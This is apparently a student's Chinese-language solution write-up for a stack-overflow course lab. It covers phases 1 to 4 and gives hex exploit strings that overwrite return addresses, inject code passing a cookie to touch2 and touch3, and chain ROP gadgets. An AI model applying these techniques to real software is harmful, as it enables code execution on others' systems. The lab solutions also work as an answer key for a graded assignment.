此lab有有5个phase，phase1到phase3考查如何利用栈溢出发起代码注入攻击，phase4至phase5考查更高级的ROP（Return-Oriented Programming）攻击。

### Phase 1

要求在getbuf函数后不返回到test函数中，而是跳转到指定的touch1函数执行。显然需要将栈中保存的返回地址覆盖成touch1函数的地址。查看反汇编代码可知，为getbuf分配了40字节的栈空间，那么需要注入的字符串为40字节的随机字符加8字节的touch1函数的首地址。

### phase 2 

相比于phase1，phase2要求额外传递参数cookie给攻击函数touch2。解决方法是使用两次跳转。在getbuf返回时跳转到注入字符串的开始位置（0x5561dc78）。此位置放置两条指令，第一条指令`movq $0x59b997fa,%rdi` 将cookie放入`rdi`寄存器中，完成传参; 第二条指令`ret` 完成第二次跳转，跳转到touch2的首地址（0x4017f0）。最终的注入字符串用按字节十六进制表示如下：

```asm
48 c7 c7 fa 97 b9 59     # movq    $0x59b997fa,%rdi
c3                       # ret
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00  #注入字符串的首地址,即movq    $0x59b997fa,%rdi指令所在位置。此内容将覆盖原来的返回地址
f0 17 40 00 00 00 00 00  #touch2函数的首地址

```



### Phase 3

phase3要求传入字符串，并且不能将字符串放在原来getbuf的栈空间。解决方法与phase2类似，不同之处在于传递给`rdi`的是字符串的首地址。

```asm
48 c7 c7 a8 dc 61 55     # mov  $0x5561dca8,%rdi  0x5561dca8是字符串的首地址
68 fa 18 40 00           # push $0x4018fa         0x4018fa是touch3的首地址
c3                       # ret
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00  #注入字符串的首地址,即mov  $0x5561dca8,%rdi指令所在位置。此内容将覆盖原来的返回地址
35 39 62 39 39 37 66 61  #字符串，即`59b997fa`
00 00 00 00 00 00 00 00
```

### Phase4

实施代码注入攻击有两个条件：知道栈的位置以及可以执行栈中的注入的代码。现代计算机可以通过栈随机和限制可执代码的区域策略来破坏这两个条件。聪明的黑客发明了ROP攻击来绕过这两个限制，达到一样的攻击效果。基本思想是，不注入自己的代码，而是执行一系列己存在的代码片段（gadget）。

phase4要求实现和phase2相同的功能，但是要使用ROP。我们可以从用户代码中找到以下两个gadget:

```asm
#gadget1首地址为0x4019ab
popq %rax    #将栈中己存储的cookie,即0x59b997fa,弹到rax
nop          #空指令
ret

#gadget2首地址为0x4019c5
movq %rax, %rdi   #将rax的内容复制给rdi,完成传参
nop
ret
```

接下来需要构造一个注入字符串，实现`getbuf->gadget1->gadget2->touch2`的调用链。注入字符串按字节十六进制表示如下：

```asm
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00   #gadget1地址，getbuf返回时使用
fa 97 b9 59 00 00 00 00   #cookie,将弹到rax
c5 19 40 00 00 00 00 00   #gadget2地址，gadget1的ret指令使用
ec 17 40 00 00 00 00 00   #touch2f地址，gadget2的ret指令使用
```

